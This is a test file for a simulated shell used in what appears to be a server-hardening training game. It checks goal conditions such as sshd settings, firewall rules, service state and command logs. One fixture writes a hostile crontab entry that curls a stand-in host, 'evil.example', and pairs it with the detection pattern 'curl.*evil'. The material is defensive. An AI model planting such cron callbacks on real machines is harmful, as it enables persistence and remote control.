import { describe, it, expect, beforeEach } from 'vitest';
import { StateGoal } from '@kritis/shared';
import { createShell } from './index';
import { ShellEngine } from './ShellEngine';
import { createHostState } from './hosts';
import { checkStateGoal, checkStateGoals } from './stateGoals';

describe('stateGoals', () => {
  let engine: ShellEngine;

  beforeEach(() => {
    engine = createShell({ type: 'bash', user: 'root', hostname: 'gateway' });
  });

  describe('file + matches', () => {
    it('passes when the file content matches the regex (multiline)', () => {
      engine.getBaseHost().vfs.addFile('/etc/ssh/sshd_config', 'Port 22\nPermitRootLogin no\n');
      expect(checkStateGoal(engine, { file: '/etc/ssh/sshd_config', matches: '^PermitRootLogin no$' })).toBe(true);
    });

    it('fails when the regex does not match', () => {
      engine.getBaseHost().vfs.addFile('/etc/ssh/sshd_config', 'PermitRootLogin yes\n');
      expect(checkStateGoal(engine, { file: '/etc/ssh/sshd_config', matches: '^PermitRootLogin no$' })).toBe(false);
    });

    it('fails when the file cannot be read', () => {
      expect(checkStateGoal(engine, { file: '/no/such/file', matches: 'x' })).toBe(false);
    });

    it('fails (never throws) on an invalid authored regex', () => {
      engine.getBaseHost().vfs.addFile('/tmp/a.txt', 'content');
      expect(() => checkStateGoal(engine, { file: '/tmp/a.txt', matches: '([' })).not.toThrow();
      expect(checkStateGoal(engine, { file: '/tmp/a.txt', matches: '([' })).toBe(false);
    });
  });

  describe('file + absentMatches', () => {
    it('passes when the file exists and does not match', () => {
      engine.getBaseHost().vfs.addFile('/etc/crontab', '# clean\n');
      expect(checkStateGoal(engine, { file: '/etc/crontab', absentMatches: 'curl.*evil' })).toBe(true);
    });

    it('fails when the pattern is still present', () => {
      engine.getBaseHost().vfs.addFile('/etc/crontab', '* * * * * curl http://evil.example\n');
      expect(checkStateGoal(engine, { file: '/etc/crontab', absentMatches: 'curl.*evil' })).toBe(false);
    });

    it('fails when the file is missing — absentMatches asserts a clean EXISTING file', () => {
      expect(checkStateGoal(engine, { file: '/etc/crontab', absentMatches: 'curl' })).toBe(false);
    });
  });

  describe('omniscient reads', () => {
    it('evaluates matches/absentMatches on a root-owned 600 file while the session user is unprivileged', () => {
      const web = createHostState({ id: 'web02', hostname: 'web02' }, { user: 'www-data' });
      engine.registerHost(web);
      web.vfs.addFile('/etc/shadow-config', 'Secret=42\n');
      web.vfs.chown('/etc/shadow-config', 'root', 'root');
      web.vfs.chmod('/etc/shadow-config', '600');
      engine.pushSession('web02', 'www-data');

      // Sanity: the in-game user cannot read the file...
      expect(web.vfs.readFile('/etc/shadow-config').ok).toBe(false);
      // ...but goal evaluation is omniscient and still sees the content.
      expect(checkStateGoal(engine, { host: 'web02', file: '/etc/shadow-config', matches: '^Secret=42$' })).toBe(true);
      expect(checkStateGoal(engine, { host: 'web02', file: '/etc/shadow-config', absentMatches: 'Backdoor' })).toBe(true);
    });

    it('a directory path fails matches goals', () => {
      engine.getBaseHost().vfs.addDirectory('/opt/data');
      expect(checkStateGoal(engine, { file: '/opt/data', matches: '.' })).toBe(false);
    });
  });

  describe('vacuous goals are rejected', () => {
    it('an empty goal object is false', () => {
      expect(checkStateGoal(engine, {})).toBe(false);
    });

    it('matches without file is false', () => {
      expect(checkStateGoal(engine, { matches: 'x' } as StateGoal)).toBe(false);
    });

    it('file without any file assertion is false', () => {
      engine.getBaseHost().vfs.addFile('/tmp/x', 'x');
      expect(checkStateGoal(engine, { file: '/tmp/x' })).toBe(false);
    });

    it('serviceState without service is false', () => {
      expect(checkStateGoal(engine, { serviceState: 'active' } as StateGoal)).toBe(false);
    });

    it('a bare loggedIn goal is a non-vacuous assertion (not treated as unmet-by-shape)', () => {
      // No login recorded → false, but by evaluation, not by the vacuous guard.
      expect(checkStateGoal(engine, { loggedIn: {} })).toBe(false);
      engine.recordLogin('local', 'password');
      expect(checkStateGoal(engine, { loggedIn: {} })).toBe(true);
    });

    it('a bare sshdEffective goal is a non-vacuous assertion', () => {
      // Empty sshdEffective object asserts nothing false → true on the base host.
      expect(checkStateGoal(engine, { sshdEffective: {} })).toBe(true);
    });

    it('serviceEnabled: false with a service is a legal, non-vacuous assertion', () => {
      const svc = engine.getBaseHost().services.find(s => s.unit === 'ssh.service')!;
      svc.enabled = 'disabled';
      expect(checkStateGoal(engine, { service: 'ssh', serviceEnabled: false })).toBe(true);
    });
  });

  describe('fileExists / fileAbsent', () => {
    it('explicit false inverts the assertion', () => {
      engine.getBaseHost().vfs.addFile('/tmp/present', 'x');
      // fileExists: false ⇔ the file must NOT exist.
      expect(checkStateGoal(engine, { file: '/tmp/present', fileExists: false })).toBe(false);
      expect(checkStateGoal(engine, { file: '/tmp/absent', fileExists: false })).toBe(true);
      // fileAbsent: false ⇔ the file MUST exist.
      expect(checkStateGoal(engine, { file: '/tmp/present', fileAbsent: false })).toBe(true);
      expect(checkStateGoal(engine, { file: '/tmp/absent', fileAbsent: false })).toBe(false);
    });

    it('fileExists: true passes iff the file exists', () => {
      engine.getBaseHost().vfs.addFile('/var/backup/dump.sql', 'data');
      expect(checkStateGoal(engine, { file: '/var/backup/dump.sql', fileExists: true })).toBe(true);
      expect(checkStateGoal(engine, { file: '/var/backup/other.sql', fileExists: true })).toBe(false);
    });

    it('fileAbsent: true passes iff the file is gone', () => {
      engine.getBaseHost().vfs.addFile('/tmp/malware.sh', 'bad');
      expect(checkStateGoal(engine, { file: '/tmp/malware.sh', fileAbsent: true })).toBe(false);
      expect(checkStateGoal(engine, { file: '/tmp/gone.sh', fileAbsent: true })).toBe(true);
    });
  });

  describe('service state', () => {
    it('matches serviceState against active, addressed as ssh / ssh.service / sshd', () => {
      for (const name of ['ssh', 'ssh.service', 'sshd']) {
        expect(checkStateGoal(engine, { service: name, serviceState: 'active' })).toBe(true);
        expect(checkStateGoal(engine, { service: name, serviceState: 'inactive' })).toBe(false);
      }
    });

    it('fails when the unit does not exist', () => {
      expect(checkStateGoal(engine, { service: 'nginx', serviceState: 'active' })).toBe(false);
    });

    it('serviceEnabled compares the enabled flag', () => {
      const svc = engine.getBaseHost().services.find(s => s.unit === 'ssh.service')!;
      expect(checkStateGoal(engine, { service: 'ssh', serviceEnabled: true })).toBe(true);
      expect(checkStateGoal(engine, { service: 'ssh', serviceEnabled: false })).toBe(false);
      svc.enabled = 'disabled';
      expect(checkStateGoal(engine, { service: 'ssh', serviceEnabled: true })).toBe(false);
      expect(checkStateGoal(engine, { service: 'ssh', serviceEnabled: false })).toBe(true);
    });
  });

  describe('firewallRule', () => {
    it('present (default true): passes on a matching global rule', () => {
      engine.getBaseHost().firewall.rules.push({ action: 'allow', port: 443 });
      expect(checkStateGoal(engine, { firewallRule: { action: 'allow', port: 443 } })).toBe(true);
      expect(checkStateGoal(engine, { firewallRule: { action: 'deny', port: 443 } })).toBe(false);
      expect(checkStateGoal(engine, { firewallRule: { action: 'allow', port: 80 } })).toBe(false);
    });

    it('is proto-insensitive: a 22/tcp rule and a proto-less rule both match a port-22 goal', () => {
      engine.getBaseHost().firewall.rules.push({ action: 'allow', port: 22, proto: 'tcp' });
      expect(checkStateGoal(engine, { firewallRule: { action: 'allow', port: 22, present: true } })).toBe(true);

      engine.getBaseHost().firewall.rules.length = 0;
      engine.getBaseHost().firewall.rules.push({ action: 'allow', port: 22 });
      expect(checkStateGoal(engine, { firewallRule: { action: 'allow', port: 22, present: true } })).toBe(true);
    });

    it('a from-scoped rule does NOT satisfy present:true', () => {
      engine.getBaseHost().firewall.rules.push({ action: 'allow', port: 22, proto: 'tcp', from: '10.0.30.5' });
      expect(checkStateGoal(engine, { firewallRule: { action: 'allow', port: 22, present: true } })).toBe(false);
    });

    it('a from-scoped rule DOES block present:false — the hole is not closed', () => {
      engine.getBaseHost().firewall.rules.push({ action: 'allow', port: 22, from: '10.0.30.5' });
      expect(checkStateGoal(engine, { firewallRule: { action: 'allow', port: 22, present: false } })).toBe(false);
    });

    it('present:false passes only when no rule matches action+port at all', () => {
      expect(checkStateGoal(engine, { firewallRule: { action: 'allow', port: 3389, present: false } })).toBe(true);
      engine.getBaseHost().firewall.rules.push({ action: 'allow', port: 3389, proto: 'tcp' });
      expect(checkStateGoal(engine, { firewallRule: { action: 'allow', port: 3389, present: false } })).toBe(false);
      // A rule with a different action does not block the goal.
      expect(checkStateGoal(engine, { firewallRule: { action: 'deny', port: 3389, present: false } })).toBe(true);
    });
  });

  describe('firewallDefaultIncoming', () => {
    it('compares the configured default policy, regardless of enabled', () => {
      expect(checkStateGoal(engine, { firewallDefaultIncoming: 'allow' })).toBe(true);
      expect(checkStateGoal(engine, { firewallDefaultIncoming: 'deny' })).toBe(false);
      engine.getBaseHost().firewall.defaultIncoming = 'deny';
      engine.getBaseHost().firewall.enabled = false;
      expect(checkStateGoal(engine, { firewallDefaultIncoming: 'deny' })).toBe(true);
    });
  });

  describe('firewallEnabled', () => {
    it('firewallEnabled: true holds iff the firewall is enabled', () => {
      engine.getBaseHost().firewall.enabled = false;
      expect(checkStateGoal(engine, { firewallEnabled: true })).toBe(false);
      engine.getBaseHost().firewall.enabled = true;
      expect(checkStateGoal(engine, { firewallEnabled: true })).toBe(true);
    });

    it('firewallEnabled: false holds iff the firewall is disabled', () => {
      engine.getBaseHost().firewall.enabled = true;
      expect(checkStateGoal(engine, { firewallEnabled: false })).toBe(false);
      engine.getBaseHost().firewall.enabled = false;
      expect(checkStateGoal(engine, { firewallEnabled: false })).toBe(true);
    });

    it('is a non-vacuous assertion on its own (registered in hasAssertion)', () => {
      // Would be rejected as shapeless if unregistered — the guard treats every
      // unregistered field as a vacuous goal and returns false regardless.
      engine.getBaseHost().firewall.enabled = true;
      expect(checkStateGoal(engine, { firewallEnabled: true })).toBe(true);
    });

    it('flips through the real ufw command: enable makes the goal true', () => {
      engine.getBaseHost().firewall.enabled = false;
      expect(checkStateGoal(engine, { firewallEnabled: true })).toBe(false);
      expect(engine.execute('ufw enable').exitCode).toBe(0); // user is root
      expect(checkStateGoal(engine, { firewallEnabled: true })).toBe(true);
    });
  });

  describe('ansibleRan (session-aware)', () => {
    it('matches a recorded run on all provided fields', () => {
      engine.recordAnsibleRun({ playbook: 'harden-fleet.yml', mode: 'syntax-check', ok: true });
      expect(checkStateGoal(engine, { ansibleRan: { playbook: 'harden-fleet.yml', mode: 'syntax-check', ok: true } })).toBe(true);
      // Every provided field must match ONE recorded run.
      expect(checkStateGoal(engine, { ansibleRan: { playbook: 'harden-fleet.yml', mode: 'apply', ok: true } })).toBe(false);
      expect(checkStateGoal(engine, { ansibleRan: { playbook: 'other.yml', mode: 'syntax-check' } })).toBe(false);
      expect(checkStateGoal(engine, { ansibleRan: { playbook: 'harden-fleet.yml', mode: 'syntax-check', ok: false } })).toBe(false);
    });

    it('matches on the playbook BASENAME however the path was recorded or asserted', () => {
      engine.recordAnsibleRun({ playbook: '/opt/playbooks/harden-fleet.yml', mode: 'apply', ok: true });
      expect(checkStateGoal(engine, { ansibleRan: { playbook: 'harden-fleet.yml', mode: 'apply' } })).toBe(true);
      expect(checkStateGoal(engine, { ansibleRan: { playbook: '/opt/playbooks/harden-fleet.yml' } })).toBe(true);
    });

    it('omitted fields match anything; a bare ansibleRan is non-vacuous', () => {
      // Nothing recorded yet → false by evaluation, not by the vacuous guard.
      expect(checkStateGoal(engine, { ansibleRan: {} })).toBe(false);
      engine.recordAnsibleRun({ playbook: 'x.yml', mode: 'check', ok: false });
      expect(checkStateGoal(engine, { ansibleRan: {} })).toBe(true);
      expect(checkStateGoal(engine, { ansibleRan: { ok: true } })).toBe(false);
    });

    it('the ansible-playbook command records --syntax-check with ok:true', () => {
      engine.getBaseHost().vfs.addFile(
        '/root/site.yml',
        '---\n- name: Test\n  hosts: all\n  tasks:\n    - name: t\n      lineinfile:\n        path: /tmp/x\n        line: hi\n'
      );
      expect(engine.execute('ansible-playbook /root/site.yml --syntax-check').exitCode).toBe(0);
      expect(checkStateGoal(engine, { ansibleRan: { playbook: 'site.yml', mode: 'syntax-check', ok: true } })).toBe(true);
      // No apply happened — an apply-mode goal stays unmet.
      expect(checkStateGoal(engine, { ansibleRan: { playbook: 'site.yml', mode: 'apply' } })).toBe(false);
    });

    it('a failed run records ok:false and does not satisfy an ok:true goal', () => {
      engine.getBaseHost().vfs.addFile('/root/broken.yml', 'not: [valid playbook');
      expect(engine.execute('ansible-playbook /root/broken.yml --syntax-check').exitCode).not.toBe(0);
      expect(checkStateGoal(engine, { ansibleRan: { playbook: 'broken.yml', mode: 'syntax-check', ok: true } })).toBe(false);
      expect(checkStateGoal(engine, { ansibleRan: { playbook: 'broken.yml', mode: 'syntax-check', ok: false } })).toBe(true);
    });
  });

  describe('commandRan (session-aware)', () => {
    it('outcome "succeeded" inherits REAL path semantics: a relative read only counts after a matching cd', () => {
      engine.getBaseHost().vfs.addFile('/srv/exports/notizen.txt', 'wichtig\n');
      const goal: StateGoal = {
        commandRan: { pattern: '^cat\\b.*notizen\\.txt', outcome: 'succeeded' },
      };

      // Wrong cwd → the real shell fails the read → goal stays unmet.
      engine.execute('cat notizen.txt');
      expect(checkStateGoal(engine, goal)).toBe(false);

      // After the matching cd the SAME relative command succeeds.
      engine.execute('cd /srv/exports');
      engine.execute('cat notizen.txt');
      expect(checkStateGoal(engine, goal)).toBe(true);
    });

    it('a valid absolute path counts without any cd', () => {
      engine.getBaseHost().vfs.addFile('/srv/exports/notizen.txt', 'wichtig\n');
      engine.execute('cat /srv/exports/notizen.txt');
      expect(
        checkStateGoal(engine, { commandRan: { pattern: 'notizen\\.txt', outcome: 'succeeded' } })
      ).toBe(true);
    });

    it('pattern and outcome must BOTH hold (a failed attempt satisfies only "failed"/"attempted")', () => {
      engine.execute('cat /no/such/file.txt');
      expect(
        checkStateGoal(engine, { commandRan: { pattern: 'file\\.txt', outcome: 'succeeded' } })
      ).toBe(false);
      expect(
        checkStateGoal(engine, { commandRan: { pattern: 'file\\.txt', outcome: 'failed' } })
      ).toBe(true);
      expect(
        checkStateGoal(engine, { commandRan: { pattern: 'file\\.txt' } })
      ).toBe(true); // default 'attempted'
      expect(
        checkStateGoal(engine, { commandRan: { pattern: 'other\\.txt' } })
      ).toBe(false);
    });

    it('is non-vacuous: a bare commandRan with an empty log is unmet, not rejected', () => {
      expect(checkStateGoal(engine, { commandRan: { pattern: '.' } })).toBe(false);
    });

    describe('per-stage matching (chained-input spoofs)', () => {
      const READ_GOAL: StateGoal = {
        commandRan: { pattern: '^(cat|head|tail)\\b.*notizen\\.txt', outcome: 'succeeded' },
      };
      beforeEach(() => {
        engine.getBaseHost().vfs.addFile('/srv/exports/notizen.txt', 'wichtig\n');
        engine.getBaseHost().vfs.addFile('/home/timo/andere.txt', 'ok\n');
      });

      it('the || decoy does NOT satisfy the goal (echo segment never executes)', () => {
        // Reviewer repro: outer string contains the target name, but the only
        // EXECUTED stage is the successful cat of a different file.
        engine.execute('cat /home/timo/andere.txt || echo notizen.txt');
        expect(checkStateGoal(engine, READ_GOAL)).toBe(false);
      });

      it('a skipped short-circuit segment does not count even if it IS the target command', () => {
        engine.execute('ls || cat /srv/exports/notizen.txt'); // ls succeeds → cat skipped
        expect(checkStateGoal(engine, READ_GOAL)).toBe(false);
      });

      it('an actually-executed chained segment DOES count', () => {
        engine.execute('cd /srv/exports && cat notizen.txt');
        expect(checkStateGoal(engine, READ_GOAL)).toBe(true);
      });

      it('each stage keeps its OWN exit code (a later failing segment does not poison it)', () => {
        // Outer attempt exits non-zero (ls /nope), but the cat stage succeeded.
        engine.execute('cat /srv/exports/notizen.txt ; ls /nope');
        expect(checkStateGoal(engine, READ_GOAL)).toBe(true);
      });

      it('an echo that merely PRINTS the target name never matches the read pattern', () => {
        engine.execute('echo cat notizen.txt');
        expect(checkStateGoal(engine, READ_GOAL)).toBe(false);
      });

      it('the PIPELINE decoy does NOT satisfy the goal (reviewer repro: failing cat | succeeding echo)', () => {
        // The pipeline's overall exit code comes from the last command (echo,
        // 0) — but stages record each pipe command separately: the cat stage
        // carries ITS exit 1 and the echo stage does not match the pattern.
        const r = engine.execute('cat /no/notizen.txt | echo ok');
        expect(r.exitCode).toBe(0); // bash semantics: last stage wins
        expect(checkStateGoal(engine, READ_GOAL)).toBe(false);
      });

      it('a successful read inside a pipeline DOES count, even when a later stage fails', () => {
        // Inverse case: cat succeeds (exit 0 stage), grep finds nothing
        // (pipeline exit 1) — the read still really happened.
        const r = engine.execute('cat /srv/exports/notizen.txt | grep kein-treffer');
        expect(r.exitCode).toBe(1);
        expect(checkStateGoal(engine, READ_GOAL)).toBe(true);
      });

      it('piping INTO the target-named command without reading it does not count', () => {
        // `echo notizen.txt | cat` — cat reads stdin, not the file; the cat
        // stage string carries no filename, the echo stage fails the ^cat.
        engine.execute('echo notizen.txt | cat');
        expect(checkStateGoal(engine, READ_GOAL)).toBe(false);
      });
    });

    describe('fileRead (semantic read record)', () => {
    const GOAL: StateGoal = { fileRead: '/srv/exports/notizen.txt' };
    beforeEach(() => {
      engine.getBaseHost().vfs.addFile('/srv/exports/notizen.txt', 'wichtig, siehe Wiki\n');
      engine.getBaseHost().vfs.addFile('/home/timo/andere.txt', 'harmlos\n');
    });

    it('reviewer repro: grep using the target name as a search PATTERN does not count', () => {
      // Only andere.txt is read; the goal file name is grep's -v pattern.
      const r = engine.execute('grep -v notizen.txt /home/timo/andere.txt');
      expect(r.exitCode).toBe(0);
      expect(checkStateGoal(engine, GOAL)).toBe(false);
    });

    it('any REAL read counts, independent of tool and phrasing', () => {
      engine.execute("awk '{print}' /srv/exports/notizen.txt");
      expect(checkStateGoal(engine, GOAL)).toBe(true);
    });

    it('grep that actually reads the target file counts', () => {
      engine.execute('grep Wiki /srv/exports/notizen.txt');
      expect(checkStateGoal(engine, GOAL)).toBe(true);
    });

    it('a relative read is recorded under its canonical absolute path', () => {
      engine.execute('cd /srv/exports');
      engine.execute('cat notizen.txt');
      expect(checkStateGoal(engine, GOAL)).toBe(true);
    });

    it('a failed read (wrong cwd) is never recorded', () => {
      engine.execute('cat notizen.txt'); // from /root — no such file
      expect(checkStateGoal(engine, GOAL)).toBe(false);
    });

    it('`< file` input redirection is a genuine read', () => {
      engine.execute('grep wichtig < /srv/exports/notizen.txt');
      expect(checkStateGoal(engine, GOAL)).toBe(true);
    });

    it('appending to the file is NOT a read (internal rewrite reads are unrecorded)', () => {
      engine.execute('echo nachtrag >> /srv/exports/notizen.txt');
      expect(checkStateGoal(engine, GOAL)).toBe(false);
    });

    it('stat is metadata, not a content read', () => {
      engine.execute('stat /srv/exports/notizen.txt');
      expect(checkStateGoal(engine, GOAL)).toBe(false);
    });

    it('scopes to goal.host: a base-host read never satisfies a web01-scoped goal', () => {
      const web = createHostState({
        id: 'web01', hostname: 'web01', ip: '10.0.20.10',
        accounts: [{ name: 'admin', password: 'pw1' }],
      });
      web.vfs.addFile('/srv/exports/notizen.txt', 'wichtig\n');
      engine.registerHost(web);

      engine.execute('cat /srv/exports/notizen.txt'); // reads the BASE host copy
      const scoped: StateGoal = { host: 'web01', fileRead: '/srv/exports/notizen.txt' };
      expect(checkStateGoal(engine, scoped)).toBe(false);

      engine.execute('ssh admin@web01');
      engine.continueInput('pw1');
      engine.execute('cat /srv/exports/notizen.txt');
      expect(checkStateGoal(engine, scoped)).toBe(true);
    });

    it('is non-vacuous: no reads yet → unmet, not rejected', () => {
      expect(checkStateGoal(engine, { fileRead: '/srv/exports/notizen.txt' })).toBe(false);
    });
  });

  describe('host filter', () => {
      it('a set goal.host only counts stages executed ON that host (reviewer repro)', () => {
        const web = createHostState({
          id: 'web01', hostname: 'web01', ip: '10.0.20.10',
          accounts: [{ name: 'admin', password: 'pw1' }],
        });
        engine.registerHost(web);

        // `ls` on the BASE host must not satisfy a web01-scoped goal …
        engine.execute('ls');
        const goal: StateGoal = { host: 'web01', commandRan: { pattern: '^ls\\b', outcome: 'succeeded' } };
        expect(checkStateGoal(engine, goal)).toBe(false);
        // … while an unscoped goal matches on any host.
        expect(checkStateGoal(engine, { commandRan: { pattern: '^ls\\b', outcome: 'succeeded' } })).toBe(true);

        // After an ssh session onto web01 the same command counts there.
        engine.execute('ssh admin@web01');
        engine.continueInput('pw1');
        engine.execute('ls');
        expect(checkStateGoal(engine, goal)).toBe(true);
      });

      it('an unresolvable goal.host is false, never a throw', () => {
        engine.execute('ls');
        expect(checkStateGoal(engine, { host: 'ghost', commandRan: { pattern: '^ls\\b' } })).toBe(false);
      });
    });
  });

  describe('host resolution', () => {
    it('unknown host returns false and never throws', () => {
      expect(() => checkStateGoal(engine, { host: 'ghost', fileExists: true, file: '/etc/passwd' })).not.toThrow();
      expect(checkStateGoal(engine, { host: 'ghost', file: '/etc/passwd', fileExists: true })).toBe(false);
    });

    it('evaluates against a registered secondary host', () => {
      const web = createHostState({ id: 'web01', hostname: 'web01.stadtwerke.local', ip: '10.0.20.10' });
      engine.registerHost(web);
      web.vfs.addFile('/var/www/index.html', 'hacked');
      expect(checkStateGoal(engine, { host: 'web01', file: '/var/www/index.html', matches: 'hacked' })).toBe(true);
      // Base host does not have the file — an unset host must not hit web01.
      expect(checkStateGoal(engine, { file: '/var/www/index.html', matches: 'hacked' })).toBe(false);
    });
  });

  describe('loggedIn (session-aware)', () => {
    it('matches a recorded login by host + method', () => {
      const web = createHostState({ id: 'web01', hostname: 'web01.stadtwerke.local', ip: '10.0.20.10' });
      engine.registerHost(web);
      engine.recordLogin('web01', 'publickey');
      expect(checkStateGoal(engine, { loggedIn: { host: 'web01', method: 'publickey' } })).toBe(true);
    });

    it('a publickey-required goal is NOT satisfied by a password login', () => {
      const web = createHostState({ id: 'web01', hostname: 'web01', ip: '10.0.20.10' });
      engine.registerHost(web);
      engine.recordLogin('web01', 'password');
      expect(checkStateGoal(engine, { loggedIn: { host: 'web01', method: 'password' } })).toBe(true);
      expect(checkStateGoal(engine, { loggedIn: { host: 'web01', method: 'publickey' } })).toBe(false);
    });

    it('host given but never logged into → false', () => {
      const web = createHostState({ id: 'web01', hostname: 'web01', ip: '10.0.20.10' });
      engine.registerHost(web);
      expect(checkStateGoal(engine, { loggedIn: { host: 'web01' } })).toBe(false);
    });

    it('resolves the login host by hostname / IP, not only id', () => {
      const web = createHostState({ id: 'web01', hostname: 'web01.stadtwerke.local', ip: '10.0.20.10' });
      engine.registerHost(web);
      engine.recordLogin('web01', 'publickey');
      expect(checkStateGoal(engine, { loggedIn: { host: 'web01.stadtwerke.local', method: 'publickey' } })).toBe(true);
      expect(checkStateGoal(engine, { loggedIn: { host: '10.0.20.10', method: 'publickey' } })).toBe(true);
    });

    it('unknown login host → false, never throws', () => {
      engine.recordLogin('web01', 'publickey');
      expect(() => checkStateGoal(engine, { loggedIn: { host: 'ghost' } })).not.toThrow();
      expect(checkStateGoal(engine, { loggedIn: { host: 'ghost' } })).toBe(false);
    });

    it('host omitted → any recorded login matching the method counts', () => {
      const web = createHostState({ id: 'web01', hostname: 'web01', ip: '10.0.20.10' });
      engine.registerHost(web);
      expect(checkStateGoal(engine, { loggedIn: { method: 'publickey' } })).toBe(false);
      engine.recordLogin('web01', 'publickey');
      expect(checkStateGoal(engine, { loggedIn: { method: 'publickey' } })).toBe(true);
      // A password login does not satisfy a publickey-only, host-omitted goal.
      expect(checkStateGoal(engine, { loggedIn: { method: 'password' } })).toBe(false);
    });
  });

  describe('sshdEffective', () => {
    it('permitRootLogin:false is FALSE when the file says no but sshd was NOT restarted', () => {
      // File hardened, but the running daemon still has the default (permit=true).
      engine.getBaseHost().vfs.addFile('/etc/ssh/sshd_config', 'PermitRootLogin no\n');
      expect(checkStateGoal(engine, { file: '/etc/ssh/sshd_config', matches: '^PermitRootLogin no$' })).toBe(true);
      expect(checkStateGoal(engine, { sshdEffective: { permitRootLogin: false } })).toBe(false);
    });

    it('permitRootLogin:false becomes TRUE only after systemctl restart ssh', () => {
      engine.getBaseHost().vfs.addFile('/etc/ssh/sshd_config', 'PermitRootLogin no\n');
      engine.execute('sudo systemctl restart ssh');
      expect(checkStateGoal(engine, { sshdEffective: { permitRootLogin: false } })).toBe(true);
    });

    it('passwordAuthentication:false requires a restart to take effect', () => {
      engine.getBaseHost().vfs.addFile('/etc/ssh/sshd_config', 'PasswordAuthentication no\n');
      expect(checkStateGoal(engine, { sshdEffective: { passwordAuthentication: false } })).toBe(false);
      engine.execute('sudo systemctl restart ssh');
      expect(checkStateGoal(engine, { sshdEffective: { passwordAuthentication: false } })).toBe(true);
    });

    it('honors the INNER sshdEffective.host (overrides goal.host / base host)', () => {
      const web = createHostState({ id: 'web02', hostname: 'web02' });
      web.vfs.addFile('/etc/ssh/sshd_config', 'PermitRootLogin no\n');
      web.refreshSshdEffective();
      engine.registerHost(web);
      // Base host stays permissive; only the inner host names web02.
      expect(checkStateGoal(engine, { sshdEffective: { host: 'web02', permitRootLogin: false } })).toBe(true);
      expect(checkStateGoal(engine, { sshdEffective: { permitRootLogin: false } })).toBe(false);
      // Unresolvable inner host → false, never throws.
      expect(checkStateGoal(engine, { sshdEffective: { host: 'nix', permitRootLogin: false } })).toBe(false);
    });

    it('evaluates against a named secondary host, defaults true when the value already holds', () => {
      const web = createHostState({
        id: 'web01', hostname: 'web01',
        vfsOverlay: { files: [{ path: '/etc/ssh/sshd_config', content: 'PermitRootLogin yes\n' }] },
      });
      engine.registerHost(web);
      // Effective already permits root (file says yes, seeded at build).
      expect(checkStateGoal(engine, { sshdEffective: { host: 'web01', permitRootLogin: true } })).toBe(true);
      expect(checkStateGoal(engine, { sshdEffective: { host: 'web01', permitRootLogin: false } })).toBe(false);
    });

    it('unknown host → false, never throws', () => {
      expect(() => checkStateGoal(engine, { sshdEffective: { host: 'ghost', permitRootLogin: false } })).not.toThrow();
      expect(checkStateGoal(engine, { sshdEffective: { host: 'ghost', permitRootLogin: false } })).toBe(false);
    });
  });

  describe('combined fields and checkStateGoals', () => {
    it('ANDs multiple fields on one goal', () => {
      engine.getBaseHost().vfs.addFile('/etc/ssh/sshd_config', 'PermitRootLogin no\nPasswordAuthentication yes\n');
      expect(checkStateGoal(engine, {
        file: '/etc/ssh/sshd_config',
        matches: '^PermitRootLogin no$',
        absentMatches: '^PasswordAuthentication yes$',
      })).toBe(false);
      expect(checkStateGoal(engine, {
        file: '/etc/ssh/sshd_config',
        matches: '^PermitRootLogin no$',
        absentMatches: '^PermitRootLogin yes$',
      })).toBe(true);
    });

    it('checkStateGoals requires a non-empty list where every goal holds', () => {
      expect(checkStateGoals(engine, [])).toBe(false);
      engine.getBaseHost().vfs.addFile('/tmp/done', 'ok');
      const goals: StateGoal[] = [
        { file: '/tmp/done', fileExists: true },
        { service: 'ssh', serviceState: 'active' },
      ];
      expect(checkStateGoals(engine, goals)).toBe(true);
      expect(checkStateGoals(engine, [...goals, { service: 'ssh', serviceState: 'failed' }])).toBe(false);
    });
  });
});
